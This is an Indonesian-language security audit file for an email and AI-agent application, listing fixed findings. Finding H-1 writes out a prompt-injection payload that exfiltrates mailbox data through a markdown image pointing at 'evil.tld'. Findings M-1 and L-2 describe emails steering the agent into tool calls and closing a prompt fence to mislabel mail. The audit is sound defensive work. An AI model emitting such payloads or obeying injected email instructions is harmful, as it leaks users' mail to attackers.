# ISSUES.md — Codebase Audit

Diperbarui: 2026-10-31 · Branch `dev` · Scope: `apps/server` (Go/Fiber/Authula), `apps/web-ui` (React/Vite), `apps/main-web`, `apps/docs`, `.github/workflows`

Audit sebelumnya (2026-10-25, S-1 s.d. S-8) diringkas di bagian 4. Sejak itu masuk: agent chat + tools + approval, agent bots, skills, MCP server eksternal (termasuk OAuth hosted), endpoint `/mcp` + API key, IP block, scope LLM provider platform, situs docs, plan, subscription, dan wallet. Audit ini mencakup semuanya.

Isi:

1. **Security findings**, diurutkan per level.
2. **Ponytail audit** (complexity / dead code).
3. **Peta endpoint**: mana yang dipakai web-ui, mana yang untuk pihak luar, mana yang belum punya UI.
4. Ringkasan audit 2026-10-25.
5. Already solid (jangan di-flag ulang).

Metode:

- Review manual semua rute di `cmd/api/routes.go`, middleware, handler, `mailagent`, `mailai`, `mcpclient`, `mcptools`, `ipblock`, `netguard`, render markdown dan email di web-ui, serta workflow CI.
- `pnpm audit --prod`: bersih.
- `govulncheck ./...`: 0 temuan reachable.
- `deadcode -test ./...`.
- Secret scan pada file yang di-track.

**Status (2026-10-29, sesi yang sama):**

- Semua temuan High, Medium dan Low sudah diperbaiki, kecuali yang ditandai **PARSIAL**, **DEFERRED** atau **BY DESIGN**.
- Verifikasi:
  - test integrasi Go lulus, termasuk test baru untuk OAuth finish, read-only key, IP block, fence prompt, kuota 402, webhook top up (401/paid/replay), scope platform, dan batas mailbox ke-21;
  - typecheck + lint web-ui dan main-web lulus; build vite lulus;
  - build docs lulus.

---

## 1. Security findings (urut level)

### H-1 · High — Prompt injection lewat email bisa mengeksfiltrasi data mailbox via gambar markdown — ✅ FIXED

- **Where:**
  - `apps/web-ui/src/components/block/common/markdown.tsx`
  - sink: `agent-panel.tsx`, `skill-menu.tsx`, `mail-reader.tsx`
- **What:**
  - Output model dirender react-markdown tanpa override `img`.
  - Email penyerang bisa menyuruh model menutup jawabannya dengan `![](https://evil.tld/?d=<isi mailbox>)`.
  - Browser langsung mengambil gambar itu (CSP mengizinkan `img-src https:`), jadi tanpa klik pun data sudah terkirim.
- **Diperbaiki:**
  - Gambar dari output model tidak pernah dimuat: `img` dirender sebagai link teks.
  - User yang memilih membukanya.

### H-2 · High — OAuth callback tidak terikat ke user yang memulainya (account-linking CSRF) — ✅ FIXED

- **Where:** `apps/server/internal/handlers/email_account.go`, `internal/handlers/mcp_server.go`, `internal/lib/mailoauth/state.go`
- **What:**
  - Callback menyimpan token hanya berdasarkan state yang ditandatangani.
  - Penyerang (akun Cloud mana pun) bisa memulai flow untuk organisasinya, mengirim `auth_url` ke korban, lalu mailbox Gmail (atau token Notion/Linear) korban masuk ke organisasi penyerang.
  - `requestOrigin` juga menerima Origin/Referer apa pun, jadi browser korban bisa dialihkan ke domain penyerang.
- **Diperbaiki:**
  - Callback tidak menyimpan apa pun. Ia hanya memverifikasi state, lalu mengembalikan browser ke web app dengan `code` dan `state`.
  - Web app memanggil endpoint ber-auth baru:
    - `POST /api/v1/email-accounts/oauth/:provider/finish`
    - `POST /api/v1/mcp-servers/oauth/finish`
  - Endpoint itu menolak (403) bila user yang login bukan `state.UserID`, dan mengecek ulang keanggotaan/kepemilikan organisasi.
  - Origin tujuan wajib ada di `CORS_ALLOWED_ORIGINS` atau origin API sendiri.
  - Cara ini tetap jalan untuk mode web app hosted + API self-hosted lintas origin. Cookie binding tidak dipakai karena akan merusak mode itu.

### M-1 · Medium — Tool MCP eksternal jalan di chat tanpa approval, bisa dipicu email — ✅ FIXED

- **Where:** `internal/mailagent/tools.go`, `mcp.go`, `agent.go`; `internal/lib/mcpclient/mcpclient.go`
- **What:** Email yang dibaca agent bisa menyuruh model memanggil `mcp__slack__post_message` dan sejenisnya dalam turn yang sama.
- **Diperbaiki:**
  - `readOnlyHint` tiap tool kini disimpan saat sync.
  - Turn dianggap "tainted" begitu memegang konten tak tepercaya:
    - `get_mail` atau `search_mails` sudah dipanggil;
    - turn tentang satu email;
    - ada hasil tool sebelumnya di riwayat percakapan;
    - hasil tool MCP apa pun.
  - Setelah tainted, tool MCP yang bukan read-only tidak lagi ditawarkan, dan bila tetap dipanggil akan ditolak.
- **Catatan:** tool yang di-sync sebelum perubahan ini dianggap "menulis" sampai server di-sync ulang (default aman).

### M-2 · Medium — Header rahasia MCP terkirim ke URL baru — ✅ FIXED

- **Where:** `internal/handlers/mcp_server.go` (`build`)
- **What:** Edit/test dengan URL baru dan nilai header kosong akan memakai ulang header tersimpan (mis. PAT GitHub) dan mengirimnya ke host baru.
- **Diperbaiki:** nilai header kosong hanya mengambil nilai tersimpan selama URL-nya sama, seperti aturan LLM key.

### M-3 · Medium — Auto-block bisa mengunci semua user bila IP klien adalah proxy bersama — ✅ FIXED

- **Where:** `internal/ipblock/ipblock.go`, `cmd/api/server.go`
- **What:** Dengan `TRUSTED_PROXIES` salah, semua pengunjung terlihat sebagai IP proxy, sehingga satu penyerang memblokir semua orang.
- **Diperbaiki:** alamat privat dan `TRUSTED_PROXIES` tidak pernah di-auto-block. Block manual tidak terpengaruh.

### M-4 · Medium — Klien IPv6 bisa memutar alamat untuk lolos rate limit dan auto-block — ✅ FIXED (PARSIAL)

- **Where:** `internal/middlewares/rate_limit.go`, `internal/ipblock/ipblock.go`
- **Diperbaiki:** klien IPv6 dihitung, di-rate-limit dan diblokir per `/64` (`ipblock.Subject`), baik di limiter maupun di guard.
- **Sisa:** throttle gagal sign-in per akun (bukan per IP) belum ada. Itu butuh hook di Authula. Penyerang yang punya banyak `/64` masih bisa menebak password; mitigasi saat ini: rate limit per `/64` + 2FA.

### L-1 · Low — Approve/deny action dan draft bisa race sehingga email terkirim dua kali — ✅ FIXED

- **Where:** `internal/repositories/agent.go`, `internal/handlers/agent.go`
- **Diperbaiki:**
  - `ClaimAction` dan `SetDraftStatus` kini memakai `UPDATE … WHERE status = 'pending'`.
  - Klik kedua atau tab kedua mendapat 409, bukan kiriman kedua.

### L-2 · Low — Fence konten tak tepercaya bisa ditutup lebih awal — ✅ FIXED

- **Where:** `internal/mailai/mailai.go` (`wrap`), `internal/mailagent/automation.go`, `mcp.go`, `tools.go`
- **What:** Di batch classifier, email berisi `</email>\n2 low_priority` bisa melabeli email lain (menyembunyikan alert keamanan).
- **Diperbaiki:**
  - Satu escaper bersama, `mailai.Defuse` (tag `email`, `draft`, `instruction`, `mcp_result`).
  - Dipakai di classifier, summary, translate, skill, auto-draft, `get_mail`, dan hasil tool MCP.
  - Ada unit test-nya.

### L-3 · Low — PKCE verifier terbaca di state OAuth — ✅ FIXED

- **Where:** `internal/lib/mailoauth/state.go`
- **Diperbaiki:**
  - State kini disegel AES-256-GCM, bukan sekadar HMAC.
  - Code yang bocor ke log atau history tidak bisa ditukar tanpa verifier.
  - Penting untuk MCP public client tanpa client secret.

### L-4 · Low — Header MCP dikirim ulang saat redirect lintas host — ✅ FIXED

- **Where:** `internal/lib/mcpclient/mcpclient.go`
- **Diperbaiki:** `headerTransport` hanya menambahkan header ke host server itu sendiri.

### L-5 · Low — Celah SSRF guard dan oracle DNS internal — ✅ FIXED

- **Where:** `internal/lib/netguard.go`
- **Diperbaiki:**
  - `PublicAddr` kini juga menolak `192.0.0.0/24`, `198.18.0.0/15`, `240.0.0.0/4`, `64:ff9b::/96` (NAT64) dan `2002::/16` (6to4).
  - Pesan penolakan tidak lagi menyebut alamat IP internal.

### L-6 · Low — Batas run agent hanya per IP — ✅ FIXED (PARSIAL)

- **Where:** `internal/handlers/agent.go`
- **Diperbaiki:** maksimal 2 jawaban agent berjalan bersamaan per user (429 bila lebih).
- **Sisa:**
  - Budget token/langkah harian per organisasi belum ada.
  - Run tetap jalan sampai `emit` berikutnya gagal saat tab ditutup.
  - Counter dihitung per replika (lihat K-5).

### K-1 · Medium — API key tidak bisa dibuat read-only — ✅ FIXED

- **Diperbaiki:**
  - Key bisa dibuat **read-only** (default di form): hanya `list_accounts`, `search_mails`, `get_mail` dan `mailbox_stats` yang ditawarkan.
  - Move, flag, label dan proposal tidak ada sama sekali untuk key itu.
  - Disimpan di metadata key, tidak bisa diubah setelah dibuat.

### K-2 · Low — `decideAction` hanya mengecek keanggotaan organisasi — ✅ FIXED

- **Diperbaiki:** proposal hanya bisa diputuskan oleh pemilik percakapannya (`action.UserID`). Member lain mendapat 404. Penting sebelum fitur undang member rilis.

### K-3 · Info — API key global milik super user menjangkau semua organisasi — ℹ️ BY DESIGN

- Paritas dengan aplikasi (keputusan user, 2026-10-29).
- **Mitigasi:**
  - key bisa dibatasi ke satu organisasi dan dibuat read-only;
  - selalu kedaluwarsa (≤ 1 tahun);
  - dicabut saat password diganti/di-reset atau `SUPER_USER` diputar.

### K-4 · Low — Membuat API key tanpa step-up password — ⏸ ACCEPTED

- **Alasan:** user Google dan magic-link tidak punya password.
- **Mitigasi:**
  - expiry wajib;
  - activity log `api_key.created`;
  - key hanya membuka `/mcp`;
  - default read-only + scope organisasi aktif.
- **Arah ke depan:** re-auth dengan TOTP bila aktif.

### K-5 · Low — Rate limiter, idempotency, strike IP block, dan cap run agent dihitung per replika — ⏸ DEFERRED (keputusan infra)

- Lanjutan S-4. Aman selama satu instance. Butuh shared store (Redis) sebelum scale-out.
- Block IP sendiri sudah dibagi lewat PostgreSQL.

### I-1 · Info — Action pihak ketiga di CI tidak di-pin — ✅ FIXED

- `millionco/react-doctor` (punya akses tulis PR) dan `peter-evans/create-pull-request` (`contents: write`) kini di-pin ke commit SHA.
- Action resmi `actions/*` dan `docker/*` tetap di major tag.

### I-2 · Info — Situs docs tanpa header keamanan — ✅ FIXED

- `apps/docs/public/_headers`: HSTS, CSP, nosniff, `X-Frame-Options: DENY`, Referrer-Policy (diterapkan oleh Workers static assets, jadi semua halaman yang di-prerender; respons yang dirender Worker, yaitu 404, salinan Markdown dan gambar OG, tidak memakainya).

### I-3 · Info — Organisasi di trash masih bisa diakses lewat aplikasi — ✅ FIXED

- `handlers.member` kini menganggap organisasi di trash tidak ada.
- Hanya restore dan delete permanen yang memakai `memberOfAny` / `ownerOfAny`.

### I-4 · Info — Oracle keberadaan mail di `mails/bulk` — ⏸ ACCEPTED

- Hanya mengonfirmasi bahwa sebuah UUID acak ada. Dampaknya diabaikan.

---

### Batch 2026-10-31 (Q-) — kuota token, top up BorderPay, scope provider platform, batas mailbox

Cakupan baru sejak audit 2026-10-29: metering `token_usage`, kuota mingguan per plan, top up PAYG via BorderPay (webhook + kredit), scope LLM provider `platform_user`, seleksi organization per user (`member=1`, localStorage per-user, auto workspace), batas 20 mailbox per user free, dan halaman Billing.

### Q-1 · Medium — Saldo PAYG tidak pernah terdebit (top up jadi buffer abadi) — ✅ FIXED

- **Where:** `apps/server/internal/repositories/token.go` (`Balance`), `apps/server/internal/app/application.go` (`checkQuota`)
- **What:** Pemeriksaan kuota menjumlah `used < limit` lalu membiarkan saldo PAYG apa adanya — pembelian top up tidak pernah habis dipakai, jadi 10M token sekali beli menutup overflow setiap minggu selamanya.
- **Fix:** `Balance` kini derivatif: saldo tersimpan dikurangi akumulasi overflow mingguan `GREATEST(used - limit, 0)` per minggu, clamp 0. Bebas race (satu SQL), tanpa bookkeeping debit.

### Q-2 · Medium — Status top up "paid" dan kredit saldo bukan satu transaksi — ✅ FIXED

- **Where:** `apps/server/internal/handlers/quota.go` (webhook), `apps/server/internal/repositories/token.go`
- **What:** `MarkPaidIfPending` commit status dulu, `AddTokens` jalan terpisah; kredit gagal = pembayaran terkonfirmasi tapi tidak pernah terkredit, dan replay webhook tertolak sebagai "already processed".
- **Fix:** `MarkPaidAndCredit` — flip status + upsert saldo dalam satu transaksi; kredit gagal meng-rollback status sehingga retry BorderPay memproses ulang.

### Q-3 · Medium — `onUsageReport` ganda di Anthropic `Complete` melipatgandakan metering — ✅ FIXED

- **Where:** `apps/server/internal/lib/llm/llm.go:186,194`
- **What:** Sisa rekonstruksi menyisakan dua panggilan report per `Complete` — pemakaian Anthropic one-shot tercatat 2×, menguras kuota dua kali lebih cepat (integritas metering/billing).
- **Fix:** Duplikat pertama dihapus; tiap completion melapor tepat sekali.

### Q-4 · Low — Perbandingan token webhook tidak constant-time — ✅ FIXED

- **Where:** `apps/server/internal/handlers/quota.go` (`BorderPayWebhook`)
- **Fix:** `crypto/subtle.ConstantTimeCompare`, dengan penolakan token kosong dipertahankan.

### Q-5 · Low — `SetScope` menerima `platform_user` + `organization_id` sekaligus — ✅ FIXED

- **Where:** `apps/server/internal/handlers/llm_provider.go` (`SetScope`)
- **What:** Kombinasi itu menghasilkan baris provider dengan scope campuran (org id + flag platform).
- **Fix:** 400 "platform_user excludes an organization" sebelum cabang otorisasi.

### Q-6 · Low — Error DB ditelan di `Balance` dan alur kredit — ✅ FIXED

- **Where:** `apps/server/internal/repositories/token.go`
- **What:** `translateNotFound(...) != nil` menelan error database nyata menjadi `0, nil`.
- **Fix:** Hanya `sql.ErrNoRows` yang berarti "kosong/tidak pending"; sisanya dipropagasi.

### Q-7 · Low — Down migration 0015 gagal bila ada provider platform — ✅ FIXED

- **Where:** `apps/server/migrations/0015_token_quota.down.sql`
- **What:** Rekreasi index unik lama `(organization_id) NULLS NOT DISTINCT` gagal bila baris platform + baris global sama-sama `organization_id` NULL.
- **Fix:** `DELETE FROM llm_providers WHERE platform_user` sebelum drop kolom.

### Q-8 · Low — Race `checkQuota` bisa over-allow secara terbatas — ⏸ ACCEPTED

- **Where:** `apps/server/internal/app/application.go`
- **What:** Dua request paralel sama-sama lolos cek sebelum pemakaian tercatat; over-allow dibatasi token panggilan yang in-flight (jauh di bawah jatah mingguan). Reservasi atomik + rekonsiliasi tidak proporsional; metering tetap mencatat usage aktual sehingga rekap mingguan benar.

### Q-9 · Low — `checkMailboxCap` TOCTOU — ⏸ ACCEPTED

- **Where:** `apps/server/internal/handlers/email_account.go`
- **What:** Koneksi paralel bisa sedikit melewati 20; terbatas dan tanpa dampak keamanan.

### Q-10 · Medium — `token_usage` tanpa retensi — ✅ FIXED

- **Where:** `apps/server/migrations/0015_token_quota.up.sql`, `cmd/api/server.go` (`sweepTokenUsage`), `internal/repositories/token.go`
- **What:** Satu baris per panggilan LLM tanpa sweep — tabel tumbuh tanpa batas (performa query kuota jangka panjang).
- **Fix:** Sweep harian `TOKEN_USAGE_RETENTION` (default 180 hari, 0 = selamanya). Saldo PAYG derivatif dari riwayat, jadi sweep **melipat overflow minggu lama ke saldo tersimpan sebelum menghapus** (hanya minggu yang sudah lewat penuh, batas per plan), sehingga saldo efektif tidak berubah saat meter dipangkas. Migrasi 0016 ikut menjatuhkan kolom `email_account_id` yang tak pernah terisi.

### Q-17 · Medium — Dua sweep baru gagal diam-diam karena SQL tidak valid — ✅ FIXED

- **Where:** `apps/server/internal/repositories/token.go` (`ExpireStaleTopups`, `FoldOldOverflow`)
- **What:** `ExpireStaleTopups` memakai placeholder `$2`/`$3` tanpa `$1` (42P18), dan `CASE ... THEN $3 ELSE $2 END` di `FoldOldOverflow` membuat Postgres menginferensi parameter sebagai `text` (bigint - text, 42883). Keduanya gagal setiap boot dengan hanya log Warn — sweep berjalan tanpa efek tanpa terlihat.
- **Lesson:** statement sweep tak pernah dieksekusi test (hanya berjalan di boot server dengan data nyata).
- **Fix:** Penomoran parameter diperbaiki, cast eksplisit `$1::timestamptz` / `$2::bigint` / `$3::bigint`, diverifikasi langsung dengan `PREPARE`/`EXECUTE` ke database.

### Q-11 · Low — Webhook BorderPay tidak memvalidasi `x-borderpay-mode` — ⏸ ACCEPTED

- **What:** Pembayaran test vs live dibedakan token per proyek di dashboard BorderPay; kebingungan mode menuntut token lintas mode.

### Q-12 · Low — Top up `pending` tidak pernah di-expire di server — ✅ FIXED

- **Fix:** Sweep harian yang sama menandai top up `pending` berumur > 24 jam sebagai `expired` (BorderPay meng-expire QRIS 60 menit, jadi ini tak pernah terbayar).

### Q-13 · Low — `users.plan` hanya bisa diubah via SQL — ✅ FIXED

- **What:** Belum ada jalur membeli plan; enforcement sudah aktif.
- **Fix:** Checkout subscription (`POST /me/billing/subscription/checkout`) memindahkan user ke `pro` saat webhook paid. Plan `enterprise` tetap diatur manual lewat SQL.

### Q-14 · Low — List top up salah envelope JSON — ✅ FIXED

- **Where:** `apps/web-ui/src/lib/api/services/types/quota.ts`, `queries/quota.ts`
- **What:** `listTopups` diketik sebagai array polos padahal server membungkus `{data}`; konsumen menerima envelope, bukan array.
- **Fix:** `AxiosItemResponse<TokenTopup[]>` + query mengembalikan `res.data.data`.

### Q-15 · Low — Sidebar mengiklankan "Subscribe now" yang belum bisa dibeli — ✅ FIXED

- **Where:** `apps/web-ui/src/components/layout/platform/platform-panel.tsx`
- **Fix:** Label jadi "Open billing" menuju `/settings/billing` (kuota + top up), bukan aksi langganan yang belum ada.

### Q-16 · Low — Migrasi kunci organization legacy bisa lintas user — ✅ FIXED

- **Where:** `apps/web-ui/src/hooks/use-active-organization.ts`
- **Fix:** Nilai legacy `activeOrganizationId` dimigrasi ke kunci per-user hanya bila id-nya termasuk member list user tsb, lalu kunci bersama dihapus apa pun hasilnya.

---

### Batch 2026-10-31 (B-) — plan, subscription, wallet, scope provider platform

Cakupan baru sejak batch Q-: katalog plan, subscription + renewal dari wallet (migrasi 0018), top up wallet, label mailbox OAuth, scope provider platform, dan halaman pricing main-web. Urut level.

**Verifikasi:** test integrasi Go lulus dengan `-race` di PostgreSQL 18 sementara, termasuk test baru untuk B-1, B-2, B-3, B-5, B-8 dan B-9. `deadcode`, `staticcheck` dan `pnpm audit --prod` bersih; `govulncheck` tidak menemukan celah yang terpanggil. Typecheck web-ui dan build main-web lulus.

### B-1 · Medium — Sweep paralel bisa menagih wallet dua kali — ✅ FIXED

- **Where:** `apps/server/internal/repositories/billing.go` (`renewOne`)
- **What:** Komentar menyebut "row lock", tetapi `SELECT count(*)` tidak mengunci apa pun. Dua instance yang sweep bersamaan, misalnya saat rolling deploy, sama-sama lolos cek. Keduanya memotong saldo dan menulis ledger, sedangkan periode hanya diperpanjang sekali.
- **Fix:** `SELECT auto_renew ... FOR UPDATE`. Sweep kedua menunggu, lalu tidak menemukan baris yang jatuh tempo. Status `auto_renew` juga dibaca di bawah kunci, bukan dari daftar lama.

### B-2 · Medium — Plan tanpa promo membuat Pro tidak pernah berakhir — ✅ FIXED

- **Where:** `apps/server/internal/repositories/billing.go` (`DueForRenewal`, `RenewDue`)
- **What:** `discount_amount` boleh NULL, tetapi di-scan ke `int64`. Saat promo seed dihapus, misalnya lewat edit SQL, seluruh sweep gagal dengan log Warn saja. Tidak ada subscription yang diperpanjang atau kedaluwarsa, sehingga pengguna tetap Pro tanpa membayar. Satu baris gagal juga menghentikan sisanya.
- **Fix:** `COALESCE(p.discount_amount, 0)`. `RenewDue` kini lanjut ke subscription berikutnya dan mengembalikan semua error lewat `errors.Join`.

### B-3 · Medium — Perubahan plan mengubah saldo PAYG yang sudah dibayar — ✅ FIXED (PARSIAL)

- **Where:** `apps/server/internal/repositories/token.go` (`Balance`, `FoldAndDeleteOldUsage`), `internal/app/application.go`
- **What:** Overflow semua minggu dihitung ulang memakai jatah plan saat ini. Turun dari Pro ke Free membuat pemakaian Pro lama terbaca sebagai overflow, sehingga top up yang sudah dibayar terkuras. Naik dari Free ke Pro mengembalikan token yang sudah terpakai.
- **Fix:** Migrasi 0019 menambah `token_usage.weekly_limit`, yaitu jatah saat panggilan dibuat. `Balance` dan sweep mengukur tiap minggu dengan jatah itu.
- **Sisa:** Baris dari tier unlimited dan baris sebelum 0019 tetap memakai jatah tier saat ini. Minggu dengan perubahan plan memakai jatah tertinggi, sehingga pengguna yang turun plan di tengah minggu bisa memakai PAYG tanpa terpotong sampai minggu itu berakhir.

### B-4 · Low — Kuota terbuka saat database bermasalah — ✅ FIXED

- **Where:** `apps/server/internal/app/application.go` (`checkQuota`), `cmd/api/server.go` (`serve`)
- **What:** Error apa pun saat membaca role atau plan meloloskan panggilan AI. Gagal memuat katalog saat boot juga menghapus semua batas hingga sweep berikutnya, sampai 24 jam, padahal token platform berbayar.
- **Fix:** Hanya user yang tidak ditemukan yang lolos; error lain dikembalikan. Gagal memuat katalog menghentikan boot. Katalog kosong tetap jalan tanpa batas untuk server yang belum di-seed, kini dengan log Warn.

### B-5 · Low — Checkout gagal atau ditinggalkan mengunci pembelian hingga 48 jam — ✅ FIXED

- **Where:** `apps/server/internal/handlers/billing.go` (`Checkout`), `internal/repositories/billing.go`
- **What:** Satu user hanya boleh punya satu subscription `pending` atau `active`, tanpa cara membatalkan. BorderPay yang gagal, atau QRIS yang kedaluwarsa setelah 60 menit, membuat user menunggu sweep harian untuk baris berumur lebih dari 24 jam.
- **Fix:** `ExpirePending`: checkout gagal langsung diakhiri, dan checkout baru menggantikan `pending` yang berumur lebih dari 2 jam.

### B-6 · Low — Endpoint pembelian tanpa budget ketat — ✅ FIXED

- **Where:** `apps/server/cmd/api/routes.go`
- **What:** Top up token, top up wallet dan checkout memanggil API BorderPay dan menulis baris baru, tetapi memakai budget umum 120 per menit.
- **Fix:** Ketiganya memakai budget `slow` (10 per menit).

### B-7 · Low — Top up wallet terlalu besar menghasilkan error 500 — ✅ FIXED

- **Where:** `apps/server/internal/handlers/billing.go` (`WalletTopup`)
- **What:** Nominal `int64` masuk ke kolom `INTEGER` tanpa batas atas.
- **Fix:** Nominal di atas `math.MaxInt32` dijawab 400. Batas per transaksi dari BorderPay belum diterapkan di server.

### B-8 · Low — `canceled_at` tidak pernah terisi — ✅ FIXED

- **Where:** `apps/server/internal/repositories/billing.go` (`SetAutoRenew`)
- **What:** Query selalu menulis NULL, sehingga tidak ada catatan kapan user mematikan perpanjangan.
- **Fix:** Mematikan `auto_renew` mengisi waktu saat itu; menyalakannya mengosongkan kolom.

### B-9 · Low — Base URL provider platform terlihat oleh semua user — ✅ FIXED

- **Where:** `apps/server/internal/handlers/llm_provider.go` (`List`)
- **What:** `GET /llm-providers` mengirim `base_url` provider platform ke user biasa, padahal bisa berisi host internal. API key tidak bocor.
- **Fix:** `base_url` provider platform dikosongkan kecuali untuk super user.

### B-10 · Info — `pay_url` kosong dari BorderPay diterima — ✅ FIXED

- **Where:** `apps/server/internal/handlers/billing.go` (`borderPayCheckout`)
- **Fix:** Jawaban tanpa `pay_url` dijawab 502, bukan checkout tanpa tautan bayar.

### B-11 · Info — main-web tanpa header keamanan selain HSTS — ✅ FIXED (PARSIAL)

- **Where:** `apps/main-web/public/_headers`
- **Fix:** `X-Content-Type-Options`, `Referrer-Policy` dan `X-Frame-Options`. File ikut ke output build, tetapi header belum dicek di domain produksi.
- **Sisa:** CSP belum ada, dan respons yang dirender Worker tidak memakai file ini.

### B-12 · Info — Webhook tidak membandingkan nominal yang dibayar — ⏸ ACCEPTED

- **Where:** `apps/server/internal/handlers/quota.go` (`BorderPayWebhook`)
- **Alasan:** Nominal dan `reference_id` dibuat server saat checkout, dan webhook diautentikasi token. Payload BorderPay yang diproses saat ini tidak memakai nominal.

---

## 2. Ponytail audit (complexity — format asli skill)

```
delete: fake storage meter in the Platform sidebar (hard-coded "2.4 GB of 5 GB"). Replacement: a "Subscribe now" banner whose button toasts "Coming Soon". [apps/web-ui/src/components/layout/platform/platform-panel.tsx] — FIXED
delete: GET / "Hello, World!" in API-only mode; /health covers liveness. Replacement: nothing. [apps/server/cmd/api/routes.go] — FIXED
delete: AgentRepository.RenameConversation, unreachable (deadcode). Replacement: nothing. [apps/server/internal/repositories/agent.go] — FIXED
shrink: rate-limit exempt rule built twice and re-implemented for ipblock. Replacement: one clientExempt(app) shared by RateLimit and ipblock.New. [apps/server/cmd/api/server.go, routes.go, internal/middlewares/rate_limit.go] — FIXED
yagni: mailoauth.TokenStore interface with one implementation and no fake. Replacement: *repositories.EmailAccountRepository. [apps/server/internal/lib/mailoauth/mailoauth.go] — FIXED
net: about -75 lines, -0 deps.

Batch 2026-10-31 (kode baru: kuota, top up, scope platform):

delete: TokenBalanceRepository.AddTokens tanpa pemanggil sejak kredit pindah ke MarkPaidAndCredit. Replacement: nothing. [apps/server/internal/repositories/token.go] — FIXED
delete: createTopupBody, struct kosong yang tidak pernah di-bind handler. Replacement: nothing. [apps/server/internal/handlers/quota.go] — FIXED
stdlib: max64, clamping yang Go sediakan sebagai builtin. Replacement: max(0, v). [apps/server/internal/repositories/token.go] — FIXED
yagni: TokenUsage.EmailAccountID + kolomnya, selalu NULL karena usageHook tidak pernah mengisinya. Replacement: dijatuhkan via migrasi 0016. [apps/server/internal/models/token.go, migrations/0015_token_quota.up.sql] — FIXED
yagni: quotaStatus.WeekStart, TopupCheckout.QRString dan ExpiresAt — terkirim ke UI, tidak pernah dibaca. Replacement: buang field, atau tampilkan. [apps/server/internal/handlers/quota.go, apps/web-ui/src/lib/api/models/quota.ts] — FIXED

Batch 2026-10-31 (kode baru: plan, subscription, wallet):

delete: WalletRepository.Credit, DeductIfAvailable, AddTransaction, ByIDForUser, tanpa pemanggil. Replacement: nothing. [apps/server/internal/repositories/billing.go] — FIXED
delete: TokenBalanceRepository.AddTokens, tercatat FIXED di atas tetapi masih ada di kode. Replacement: nothing. [apps/server/internal/repositories/token.go] — FIXED
delete: models.TokenBalance, TokenPurposeChat, TokenPurposeComplete, SubscriptionStatusCanceled, WalletKindAdjustment, tanpa pemakai. Replacement: nothing. [apps/server/internal/models/token.go, billing.go] — FIXED
delete: APIKeyDto dan IPBlockDto, tipe tanpa pemakai. Replacement: nothing. [apps/web-ui/src/lib/api/dtos/settings/] — FIXED
stdlib: max64, tercatat FIXED di atas tetapi masih ada di kode. Replacement: max(stored-overflow, 0). [apps/server/internal/repositories/token.go] — FIXED
shrink: Scan 17 kolom ditulis ulang di MarkPaidAndActivate. Replacement: scanSubscription. [apps/server/internal/repositories/billing.go] — FIXED
shrink: parameter now di RenewDue tidak dipakai. Replacement: buang. [apps/server/internal/repositories/billing.go] — FIXED
shrink: QRString dan ExpireAt didecode lalu dibuang di borderPayCheckout. Replacement: hanya PayURL. [apps/server/internal/handlers/billing.go] — FIXED
```

`deadcode ./...`, tanpa `-test`, kini kosong. `-test` menganggap fungsi yang hanya dipakai test sebagai hidup, jadi pakai versi tanpa flag.
net: about -95 lines, -0 deps (batch ini). — SEMUA FIXED

Web-ui: komponen UI sudah lean, knip tidak menemukan file atau dependensi yang tidak dipakai. `@lexical/*` tampak tak diimpor, tetapi merupakan peer dependency `@lexkit/editor`. Sisa laporan knip adalah tipe yang dipakai lewat re-export `Models`.

Sengaja dipertahankan (keputusan user): kartu "Soon" untuk Billing, Members, Roles, Tools dan Plugins.

---

## 3. Peta endpoint

### Dipakai web-ui

Semua rute `/api/v1` kecuali yang tercantum di dua tabel di bawah. Ini termasuk:

- organizations, email-accounts, mails, AI per-mail;
- llm-providers, agent-bots, skills, mcp-servers, agent (chat SSE, conversations, actions, drafts);
- `me` (profile, security, password, activity-logs, api-keys, quota, billing), ip-blocks;
- rute Authula: `me`, `sign-out`, `email-password/sign-in`, `token`, `token/refresh`, `totp/*`, `oauth2/authorize/google`;
- `GET /health` (pemilih server di halaman sign-in).

### Untuk pihak luar (by design, bukan dari UI)

| Endpoint | Dipakai oleh |
| --- | --- |
| `POST /mcp` | MCP client (Claude Desktop, Cursor, …) dengan API key |
| `GET /health` | Healthcheck container (`/app/healthcheck`), load balancer |
| `GET /api/v1/email-accounts/oauth/:provider/callback` | Redirect dari provider mailbox (Google, Microsoft, Zoho) |
| `GET /api/v1/mcp-servers/oauth/callback` | Redirect dari MCP server hosted |
| `GET /api/v1/auth/oauth2/callback/google` | Redirect sign-in Google |
| `GET /api/v1/auth/email-password/verify-email` | Link di email verifikasi |
| `POST /api/v1/webhooks/borderpay` | Webhook pembayaran BorderPay, diautentikasi token |

### Ada di API, belum ada UI

| Endpoint | Catatan |
| --- | --- |
| `POST /api/v1/auth/email-password/sign-up` | Belum ada halaman sign-up. User Cloud baru hanya bisa masuk lewat Google (akun dibuat saat sign-in pertama). |
| `/api/v1/auth/magic-link/*` | Sign-in magic link |
| `POST /api/v1/auth/email-password/request-password-reset` + rute reset | Lupa password |
| `PUT /api/v1/organizations/:id/restore`, `DELETE /api/v1/organizations/:id/force` | Organisasi bisa dibuang ke trash dari UI, tapi tidak bisa di-restore atau dihapus permanen |
| `GET /api/v1/organizations/:id/llm-provider` | Redundan untuk web-ui (dibaca lewat `GET /api/v1/llm-providers`); dipertahankan untuk klien API |

---

## 4. Ringkasan audit 2026-10-25

| ID | Level | Temuan | Status |
| --- | --- | --- | --- |
| S-1 | Medium | Token auth di cookie yang terbaca JavaScript | ✅ FIXED parsial (refresh 24 jam; non-HttpOnly disengaja untuk API lintas origin) |
| S-2 | Medium | Tidak ada CSP | ✅ FIXED |
| S-3 | Low | Tidak ada HSTS | ✅ FIXED |
| S-4 | Low | Rate limiter dan idempotency in-memory per replika | ⏸ DEFERRED, kini digabung ke K-5 |
| S-5 | Low | Activity log tanpa retensi | ✅ FIXED (`ACTIVITY_LOG_RETENTION`) |
| S-6 | Low | Advisory dependensi + scan belum otomatis | ✅ FIXED (`security-audit.yml`) |
| S-7 | Info | CSRF: SameSite=Lax + CrossOrigin | ℹ️ NO CHANGE NEEDED |
| S-8 | Info | `cid:` mati di CSP frame email | ✅ FIXED |

---

## 5. Already solid (jangan di-flag ulang)

- **API key / `/mcp`:**
  - Plugin Authula `api-key` dan `access-control` dipasang tanpa hook dan rute, jadi key tidak pernah menjadi sign-in penuh.
  - `Verify` menegakkan `Enabled` dan expiry.
  - Key dicabut saat password diganti/di-reset dan saat `SUPER_USER` di-seed ulang.
  - Scope organisasi dan read-only dicek di setiap panggilan.
  - Batch JSON-RPC ditolak, body dibatasi 256 KB, request dibatasi 1 menit.
